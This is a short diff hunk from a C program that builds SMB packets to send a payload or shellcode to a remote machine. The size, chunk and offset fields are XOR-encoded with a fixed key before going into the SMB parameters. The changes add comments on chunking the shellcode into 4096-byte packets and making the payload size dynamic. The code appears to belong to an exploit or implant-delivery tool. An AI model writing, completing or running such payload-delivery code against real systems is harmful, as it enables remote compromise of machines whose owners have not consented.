@@ -176,8 +176,15 @@ int main() {
 	unsigned int XorKey = 0x58581162;
 	
     smb_parameters *smb_params = (smb_parameters*)(buffer + sizeof(netbios) + sizeof(smb_header) + sizeof(Trans_Response));
+
+    //make DataSize dynamic where it calculates the size of the buffer of the payload / shellcode
+    //In this case, this is static but will change to be dynamic in the future.
     unsigned long DataSize = 0x507308 ^ XorKey;
+	
+    //size of the chunk of the payload being sent.  all but last packet are 4096
     unsigned long chunksize = 4096 ^ XorKey;
+
+    //offset begins at 0 and increments based on the previous packets sent
     unsigned long offset = 0 ^ XorKey;
     
     memcpy(smb_params->parameters, (unsigned char*)&DataSize, 4);
